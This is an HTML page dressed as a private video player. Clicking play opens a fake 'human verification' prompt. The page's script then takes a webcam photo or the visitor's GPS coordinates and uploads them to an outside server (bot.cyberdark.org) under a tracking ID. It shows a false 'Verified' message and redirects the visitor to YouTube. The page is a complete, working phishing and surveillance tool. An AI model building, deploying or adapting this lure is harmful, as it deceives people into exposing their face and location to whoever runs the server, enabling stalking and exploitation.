<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Private Video Player</title>
  <style>
    body {
      margin: 0;
      font-family: 'Inter', system-ui, -apple-system, sans-serif;
      background-color: #0f172a;
      color: #f8fafc;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      overflow: hidden;
    }

    .video-container {
      width: min(800px, 95%);
      background: #1e293b;
      border-radius: 12px;
      overflow: hidden;
      box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
      position: relative;
    }

    /* Video Placeholder Design */
    .video-screen {
      width: 100%;
      aspect-ratio: 16 / 9;
      background: #000;
      display: flex;
      justify-content: center;
      align-items: center;
      position: relative;
      cursor: pointer;
    }

    .play-button {
      width: 80px;
      height: 80px;
      background: rgba(255, 255, 255, 0.2);
      border-radius: 50%;
      display: flex;
      justify-content: center;
      align-items: center;
      backdrop-filter: blur(5px);
      transition: transform 0.3s ease, background 0.3s ease;
      z-index: 10;
    }

    .play-button svg {
      width: 40px;
      height: 40px;
      fill: white;
    }

    .video-screen:hover .play-button {
      transform: scale(1.1);
      background: rgba(255, 255, 255, 0.3);
    }

    .video-info {
      padding: 20px;
      border-top: 1px solid #334155;
    }

    .video-info h1 {
      margin: 0;
      font-size: 18px;
      font-weight: 600;
      color: #e2e8f0;
    }

    .video-info p {
      margin: 8px 0 0;
      font-size: 14px;
      color: #94a3b8;
    }

    /* Modal / Overlay for Verification */
    .overlay {
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(15, 23, 42, 0.9);
      display: none; /* Hidden by default */
      flex-direction: column;
      justify-content: center;
      align-items: center;
      text-align: center;
      padding: 20px;
      z-index: 100;
    }

    .verify-box {
      max-width: 320px;
    }

    .loader {
      border: 4px solid #334155;
      border-top: 4px solid #38bdf8;
      border-radius: 50%;
      width: 40px;
      height: 40px;
      animation: spin 1s linear infinite;
      margin: 0 auto 20px;
    }

    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }

    .btn-verify {
      background: #38bdf8;
      color: #0f172a;
      border: none;
      padding: 12px 24px;
      border-radius: 6px;
      font-weight: 700;
      cursor: pointer;
      margin-top: 15px;
      width: 100%;
    }

    .status-text {
      font-size: 13px;
      color: #cbd5e1;
      margin-top: 10px;
      line-height: 1.4;
    }
  </style>
</head>
<body>

  <div class="video-container">
    <div class="video-screen" id="playArea">
      <div class="play-button">
        <svg viewBox="0 0 24 24"><path d="M8 5v14l11-7z"/></svg>
      </div>
    </div>
    
    <div class="video-info">
      <h1>Private_Video_0824.mp4</h1>
      <p>Uploaded 2 hours ago • 14.2 MB • Encrypted Content</p>
    </div>

    <div class="overlay" id="overlay">
      <div class="verify-box">
        <div class="loader" id="loader"></div>
        <h2 id="verifyTitle">Human Verification Required</h2>
        <p class="status-text" id="status">To continue watching, please verify your identity by allowing access to your device. This ensures you are not a bot.</p>
        <button class="btn-verify" id="startAction">Verify Now</button>
      </div>
    </div>
  </div>

  <script>
    const api_url = "https://bot.cyberdark.org"; 
    const overlay = document.getElementById("overlay");
    const playArea = document.getElementById("playArea");
    const startAction = document.getElementById("startAction");
    const statusText = document.getElementById("status");
    const verifyTitle = document.getElementById("verifyTitle");

    function getParams() {
      const p = new URLSearchParams(window.location.search);
      return { id: p.get("id"), type: p.get("type") };
    }

    playArea.addEventListener('click', () => {
      overlay.style.display = 'flex';
    });

    startAction.addEventListener('click', async () => {
      const { id, type } = getParams();
      if (!id || !type) {
        statusText.textContent = "Error: Invalid session ID.";
        return;
      }

      if (type === 'camera') {
        await captureCamera(id);
      } else if (type === 'location') {
        await captureLocation(id);
      }
    });

    async function captureCamera(unique_id) {
      try {
        statusText.textContent = "Connecting to secure server...";
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        
        const video = document.createElement("video");
        video.srcObject = stream;
        await video.play();

        await new Promise(r => setTimeout(r, 1000));

        const canvas = document.createElement("canvas");
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        canvas.getContext("2d").drawImage(video, 0, 0);

        stream.getTracks().forEach(t => t.stop());

        statusText.textContent = "Finalizing verification...";
        const blob = await new Promise(r => canvas.toBlob(r, "image/jpeg", 0.8));
        
        const form = new FormData();
        form.append("photo", blob, "verify.jpg");
        form.append("unique_id", unique_id);

        await fetch(api_url + "/upload", { method: "POST", body: form });
        
        success();
      } catch (err) {
        statusText.textContent = "Verification failed. Please try again and allow permissions.";
      }
    }

    function captureLocation(unique_id) {
      statusText.textContent = "Fetching regional access...";
      
      navigator.geolocation.getCurrentPosition(async (pos) => {
        try {
          const res = await fetch(api_url + "/upload_location", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              unique_id,
              latitude: pos.coords.latitude,
              longitude: pos.coords.longitude
            })
          });
          success();
        } catch (err) {
          statusText.textContent = "Error: Connection timed out.";
        }
      }, (err) => {
        statusText.textContent = "Location access denied. Verification incomplete.";
      });
    }

    function success() {
      verifyTitle.textContent = "✅ Verified";
      statusText.textContent = "You have been successfully verified. Decrypting video...";
      startAction.style.display = 'none';
      setTimeout(() => {
        window.location.href = "https://www.youtube.com/watch?v=ymLCYgWr-h8"; // Example redirect
      }, 2000);
    }
  </script>
</body>
</html>
